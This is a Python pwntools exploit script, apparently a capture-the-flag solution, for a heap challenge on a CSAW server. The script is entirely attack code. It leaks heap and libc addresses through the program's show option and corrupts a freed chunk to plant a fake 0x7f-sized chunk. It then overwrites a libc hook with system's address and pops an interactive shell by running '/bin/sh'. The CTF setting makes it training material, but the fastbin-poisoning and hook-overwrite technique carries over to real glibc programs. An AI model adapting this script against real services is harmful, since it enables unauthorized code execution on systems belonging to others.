from pwn import *

#s = process("./true")
s = remote("pwn.chal.csaw.io", 7713)

s.clean()

def alloc(size, buf=None):
	s.sendline("1")
	s.sendline("%d" % size)
	if not buf:
		buf = "A"*size
	if len(buf)< size:
		buf += "B"*(size-len(buf))
	s.sendline(buf)

#make 0x71 size chunks
alloc(0x60)
alloc(0x60)

#get a smallbin
buf = "Q"*0x10 + "/bin/sh\x00"
alloc(0x100, buf)
alloc(0x20)
alloc(0x100, "R"*0x40)
alloc(0x20)

s.sendline("2")
s.sendline("2")
s.clean()

s.sendline("4")
s.sendline("2")
s.recvuntil("SHOWING....\n")
ptr = u64(s.recvuntil("|--")[:-3])

print hex(ptr)
slide = ptr-0x83

s.sendline("2")
s.sendline("4")
s.clean()

s.sendline("4")
s.sendline("4")
s.recvuntil("SHOWING....\n")
ptr2 = u64(s.recvuntil("|--")[:-3])

print hex(ptr2)

s.clean()

s.sendline("2")
s.sendline("1")

buf = "A"*0x68+p64(0x7f)+p64(slide-8)
s.sendline("3")
s.sendline("0")
s.sendline("%d" % len(buf))
s.sendline(buf)

alloc(0x60)
libc = ELF("./libc.so.remote")
libc.address = ptr-libc.sym['__malloc_hook']-0x68

buf = cyclic(0x60)
buf = buf[:buf.index(p64(0x6161676161616661))]

buf += p64(libc.sym['system'])
#buf += p64(libc.address+0xf1117)

alloc(0x60, buf)

s.clean()

s.sendline("1")
s.sendline("%d" % (ptr2+0x20))

s.interactive()
